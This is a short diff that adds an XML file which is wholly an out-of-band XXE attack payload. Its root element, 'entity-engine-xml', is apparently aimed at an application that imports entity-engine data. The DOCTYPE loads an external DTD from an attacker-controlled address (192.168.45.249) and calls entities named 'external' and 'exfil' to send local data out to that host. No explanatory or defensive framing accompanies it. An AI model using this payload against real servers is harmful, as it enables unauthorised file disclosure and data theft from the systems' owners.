@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="utf-8"?> 
+<!DOCTYPE oob [
+<!ENTITY % base SYSTEM "http://192.168.45.249/external.dtd"> 
+%base;
+%external;
+%exfil;
+]>
+<entity-engine-xml>
+</entity-engine-xml>
